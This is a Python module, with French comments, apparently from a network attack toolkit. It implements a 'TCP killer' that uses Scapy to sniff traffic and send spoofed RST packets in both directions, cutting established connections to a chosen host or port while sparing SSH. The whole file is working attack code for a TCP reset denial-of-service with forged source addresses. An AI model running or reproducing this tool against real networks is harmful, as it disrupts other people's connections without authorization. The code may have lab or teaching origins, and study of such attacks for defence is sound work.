"""
modules/tcp_killer.py
Tueur de sessions TCP sélectif.
Envoie des paquets RST forgés pour couper des connexions spécifiques.
Basé sur tp_tcp_killing.py avec gestion multi-thread et blacklist.
"""
from scapy.all import sniff, send, IP, TCP, Ether
from core.logger import log
from core.config import conf
import threading

class TCPKiller:
    def __init__(self, target_ip: str = None, target_port: int = None, blacklist: list = None):
        """
        :param target_ip: IP de la machine à couper (si None, tout le monde)
        :param target_port: Port spécifique à viser (ex: 443 pour HTTPS)
        :param blacklist: Liste de ports à ignorer (ex: [22] pour ne pas couper son propre SSH)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.blacklist = blacklist if blacklist else [22]
        self.running = False
        self.kill_count = 0

    def _send_rst(self, p):
        # Vérification flags : on vise les paquets avec flag ACK ou PSH (connexions établies)
        # 0x10 = ACK, 0x02 = SYN. On ignore les SYN seuls.
        if not p.haslayer(TCP) or (p[TCP].flags & 0x02): 
            return

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        sport = p[TCP].sport
        dport = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack

        # Filtrage Blacklist
        if sport in self.blacklist or dport in self.blacklist:
            return

        # Filtrage Cible (si définie)
        if self.target_ip and (src_ip != self.target_ip and dst_ip != self.target_ip):
            return
        
        if self.target_port and (sport != self.target_port and dport != self.target_port):
            return

        # Construction du RST
        # On tue la connexion dans les DEUX sens pour être sûr
        
        # 1. RST vers la Destination (en se faisant passer pour la Source)
        rst_1 = IP(src=src_ip, dst=dst_ip) / \
                TCP(sport=sport, dport=dport, flags="R", seq=seq)
        
        # 2. RST vers la Source (en se faisant passer pour la Destination)
        # Note: Pour être accepté, le SEQ du RST doit correspondre au ACK attendu
        rst_2 = IP(src=dst_ip, dst=src_ip) / \
                TCP(sport=dport, dport=sport, flags="R", seq=ack)

        send(rst_1, verbose=False, iface=conf.interface)
        send(rst_2, verbose=False, iface=conf.interface)
        
        self.kill_count += 1
        if self.kill_count % 10 == 0: # Log tous les 10 kills pour ne pas spammer
            log.warning(f"TCP Killer: {self.kill_count} connexions abattues ({src_ip} <-> {dst_ip})")

    def start(self):
        self.running = True
        filter_str = "tcp"
        if self.target_ip:
            filter_str += f" and host {self.target_ip}"
        
        log.info(f"TCP Killer Actif. Filtre: [{filter_str}] Blacklist: {self.blacklist}")
        
        try:
            sniff(
                iface=conf.interface,
                filter=filter_str,
                prn=self._send_rst,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            log.error(f"Erreur TCP Killer: {e}")

    def stop(self):
        self.running = False
        log.info(f"TCP Killer arrêté. Total kills: {self.kill_count}")